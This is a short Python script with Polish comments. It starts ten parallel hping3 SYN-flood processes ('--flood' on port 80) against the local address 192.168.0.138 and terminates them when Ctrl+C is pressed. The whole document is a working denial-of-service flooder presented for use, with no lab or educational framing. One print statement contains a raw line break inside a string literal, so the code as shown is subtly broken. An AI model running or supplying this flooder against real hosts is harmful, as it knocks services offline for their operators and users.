#!/usr/bin/env python3
import subprocess
import time
import signal
import os

# Liczba instancji hping3 (można dostosować do mocy maszyny)
ilosc_procesow = 10

# Komenda hping3 – wysyłanie pakietów SYN na port 80
komenda = ["sudo", "hping3", "-S", "--flood", "-p", "80", "192.168.0.138"]

# Lista aktywnych procesów
procesy = []

try:
    # Uruchomienie wielu instancji hping3 równolegle
    for _ in range(ilosc_procesow):
        proc = subprocess.Popen(komenda, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        procesy.append(proc)

    print(f"Uruchomiono {ilosc_procesow} procesów hping3.")
    print("Naciśnij Ctrl+C, aby zakończyć wszystkie...")

    # Program działa w nieskończonej pętli aż do przerwania
    while True:
        time.sleep(1)

except KeyboardInterrupt:
    # Po naciśnięciu Ctrl+C zatrzymujemy wszystkie procesy
    print("
Zatrzymywanie procesów...")
    for proc in procesy:
        try:
            proc.terminate()
            proc.wait()
        except Exception as e:
            print(f"Błąd przy zatrzymywaniu: {e}")
    print("Wszystkie procesy zakończone.")
